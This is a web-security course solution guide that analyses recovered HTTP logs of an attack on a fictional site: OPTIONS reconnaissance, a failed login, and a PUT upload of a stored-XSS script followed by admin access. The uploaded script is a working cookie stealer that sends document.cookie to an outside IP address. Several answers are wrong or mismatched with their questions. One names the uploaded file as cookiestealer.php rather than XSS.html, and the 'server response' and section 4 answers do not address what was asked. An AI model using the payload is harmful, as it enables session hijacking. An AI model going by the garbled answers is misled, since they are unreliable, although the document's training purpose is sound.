## Solution Guide: HTTP Requests and Responses

The goal of this activity was to combine skills in research and critical thinking to investigate the HTTP sequences of a web attack that occurred on your company's servers.

---

**Note:** While we can't be absolutely sure about what happened due to the corrupted logs, these are good guesses based on the information we have.

1. The following partial response was sent to the suspicious IP address. The request was completely lost and unrecoverable.


   **HTTP Response 1**

     ```HTTP
     HTTP/1.1 200 OK
     Date: Tue, 25 Sep 2018 21:21:20 GMT
     Server: Apache/2.2.21 (Unix mod_ssl/2.2.21 OpenSSL/1.0.0k DAV/2 PHP/5.4.3)
     WWW-Authenticate: Cookie realm="fakesite"
     Allow: OPTIONS, GET, POST, HEAD, PUT
     ```

    **Question:** What kind of request was used here that would cause an HTTP server to tell the client all of the HTTP request methods it will respond to?

    - Solution: They used the OPTIONS method here. This was the attacker's reconnaissance phase, where they found out all available HTTP methods that can be requested to the HTTP server.

   **Analysis:** Do you think this HTTP request method can be used by an attacker to gather information about an HTTP server? Why or why not?

   - Solution: The OPTIONS method is useful for an attacker to find out what kind of request methods they can leverage while attempting to compromise an HTTP server.

2. The system admins reported some corrupted HTTP traffic that occurred before the following recovered response:

   **HTTP Response 2**

     ```HTTP
     HTTP/1.1 401 Unauthorized
     WWW-Authenticate: Cookie realm="fakesite"
             form-action="/login"
             cookie-name=AUTH-COOKIE
     Content-Type: text/html

     <title>Unauthorized</title>
     <form action="/login" method=POST>
     <input type=hidden name=referer value="/fakesite/">
     <p><label>Username: <input name=user></label>
     <p><label>Password: <input name=pwd type=password></label>
     <p><button type=submit>Sign in</button>
     <p><a href="/register">Register for an account</a>
     </form>
     ```

    **Questions:** 
      - What status code was returned in this response?

        - Solution: 401.

      - According to the response body, what kind of method was used to generate this HTTP response?

        - Solution: While we don't see the request, we can tell the attacker attempted to log into the login portal with a POST request.

     - What sort of information was input to this HTTP request?

         - Solution: The response body shows a username and password being entered into the web page. The response error status code 401 indicates an invalid authorization attempt.

    **Analysis:** Based on the information gathered from the status code and response body, what did the attacker try to do? Were they successful? 

    - Solution:  While we can't see the request, we can tell the attacker attempted to log into the login portal with a POST request. The response body shows a username and password being entered into the webpage while the the response error status code 401 indicates an invalid authorization attempt.

3. The following HTTP request and response were also recovered:

   **HTTP Request 1**

     ```HTTP
     PUT /XSS.html HTTP/1.1
     User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
     Host: www.fakesite.com/blog

     <script type="text/javascript">
     document.location='http://133.7.13.37/cookiestealer.php?c='+document.cookie;
     </script>
     ```

   **HTTP Response 3**

     ```HTTP
     HTTP/1.1 201 Created
     Date: Mon, 05 May 2014 12:28:53 GMT
     Server: Apache/2.2.14 (Win32)
     Content-type: text/html
     Content-length: 30
     Connection: Closed
     ```

   **Questions:** 
      - What type of method was used in the request?
         - Solution: The attacker used the PUT method.

      - What file name was uploaded to the site, according to the request body?
        - Solution: `cookiestealer.php`.

   **Analysis:** 
      - Based on the request method and request body, what do you think happened here? 
      
        **Hint**: Google the term "XSS" if you need help.

        - Solution: The attacker could not inject XSS code without uploading a file with it.
    
      - How did the server respond?

        - Solution: The attacker used the PUT method to upload a cross-site script to steal the cookies of users and send the cookies to their own server.

4. The next partial request and header was received by our HTTP server. The data after this log was completely lost:

   **HTTP Request 4**

     ```HTTP
     GET https://www.fakesite.com/admin HTTP/1.1
     Cookie: $Version="1"; AUTH-COOKIE="sdf354s5c1s8e1s"; $Path="/admin"
     ```

   **Question:** Look back at the previous response (HTTP Response 3). What request and headers are seen in this GET request?
    
    - Solution: Looking at HTTP Response 3, the corresponding response to the PUT request was a success.

    **Analysis:** Is there anything interesting about the URL requested?
    
    - Solution: Looking at HTTP Request 4, it's clear that the attacker stole a cookie and was able to log into the admin portal using a GET request with stolen cookies set in the header.

--- 
© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

